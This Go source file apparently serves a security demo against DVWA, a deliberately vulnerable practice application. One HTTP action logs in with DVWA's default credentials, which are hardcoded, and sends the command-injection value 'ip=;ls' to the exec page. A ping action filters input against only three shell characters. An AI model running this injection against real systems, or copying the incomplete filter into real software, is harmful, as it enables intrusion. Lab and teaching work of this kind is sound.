package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"strings"

	"github.com/labstack/echo/v4"
)

func registerActions(e *echo.Echo) {
	// ACTION #1 PING
	e.POST("/ping", handlePingAction)

	// ACTION #2 COMMAND INJECTION
	e.POST("/command-injection", handleCommandInjectionAction)
}

func handlePingAction(c echo.Context) error {
    ipFqdn := c.FormValue("ip-fqdn")

    // Sanitize the input to avoid command injection
    if strings.ContainsAny(ipFqdn, ";&|") {
        return c.String(http.StatusBadRequest, "Invalid characters in input")
    }

    // Create a new command for ping
    cmd := exec.Command("ping", "-c", "4", ipFqdn)

    // Create a pipe to capture the command output
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        return c.String(http.StatusInternalServerError, err.Error())
    }

    // Create a reader for command output
    reader := bufio.NewReader(stdout)

    // Start the command
    if err := cmd.Start(); err != nil {
        return c.String(http.StatusInternalServerError, err.Error())
    }

    c.Response().Header().Set("Content-Type", "text/event-stream")

    // Create a goroutine to read and send the command output
    go func() {
        defer stdout.Close()

        // While command is running
        for {
            // Read line from the command's output
            line, _, err := reader.ReadLine()
            if err != nil {
                if err == io.EOF {
                    break
                }
                // log the error
                return
            }

            // Write the output to SSE
            c.Response().Write([]byte(fmt.Sprintf("data: %s\n\n", line)))

            c.Response().Flush() // Send it immediately
        }

        // Wait for the command to complete
        if err := cmd.Wait(); err != nil {
            // log the error
        }
    }()

    return c.NoContent(http.StatusOK)
}


func handleCommandInjectionAction(c echo.Context) error {
	username := c.FormValue("username")

	// Map usernames to passwords
	userPassMap := map[string]string{
		"admin":   "password",
		"gordonb": "abc123",
		"1337":    "charley",
		"pablo":   "letmein",
		"smithy":  "password",
	}

	password, ok := userPassMap[username]
	if !ok {
		return c.String(http.StatusBadRequest, "Invalid username")
	}

	// Perform Authentication
	cmd := exec.Command("curl", DVWA_URL+"/login.php",
		"-H", "authority: "+DVWA_HOST,
		"-H", "cache-control: max-age=0",
		"-H", "content-type: application/x-www-form-urlencoded",
		"-H", "origin: "+DVWA_URL,
		"-H", "referer: "+DVWA_URL+"/",
		"-H", "user-agent: "+USER_AGENT,
		"--insecure",
		"--silent",
		"--data-raw", "username="+username+"&password="+password+"&Login=Login",
		"-c", "cookie.txt",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	// Execute Command Injection
	cmd2 := exec.Command("curl", DVWA_URL+"/vulnerabilities/exec/",
		"-H", "authority: "+DVWA_HOST,
		"-H", "cache-control: max-age=0",
		"-H", "content-type: application/x-www-form-urlencoded",
		"-H", "origin: "+DVWA_URL,
		"-H", "referer: "+DVWA_URL+"/index.php",
		"-H", "user-agent: "+USER_AGENT,
		"--insecure",
		"--silent",
		"--data-raw", "ip=;ls&Submit=Submit",
		"-b", "cookie.txt",
	)

	output2, err := cmd2.CombinedOutput()
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	// Return the HTML content of the two curl command
	return c.HTML(http.StatusOK, string(output)+"\n"+string(output2))

}
